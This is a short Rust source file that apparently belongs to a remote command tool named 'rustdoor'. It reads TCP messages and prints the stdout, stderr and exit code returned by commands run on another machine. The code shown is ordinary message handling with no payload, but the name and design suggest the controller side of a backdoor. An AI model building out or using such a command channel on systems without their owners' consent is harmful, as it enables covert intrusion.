use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpStream};
use std::str::from_utf8;

use byteorder::{BigEndian, WriteBytesExt};
use rustdoor::communication::messages::{
    Message, MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_HEADER_LENGTH,
};
use rustdoor::communication::server::get_message;
use std::sync::mpsc::TryRecvError;
use std::sync::mpsc::TryRecvError::Disconnected;

fn handle_response(message: Message) {
    println!("Response got: {:?}", message);
    if message.message_type == MessageType::RunCommandType as u8 {
        let response: RunCommandResponse =
            ron::de::from_bytes(&message.serialized_message).unwrap();
        println!("Stdout: {:?} ", from_utf8(&response.stdout).unwrap());
        println!("Stderr: {:?} ", from_utf8(&response.stderr).unwrap());
        println!("Error code: {:?}", response.error_code);
    }
}

pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
    match get_message(&stream) {
        Ok(message) => {
            handle_response(message);
        }
        Err(e) => {
            println!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    }
    Ok(())
}
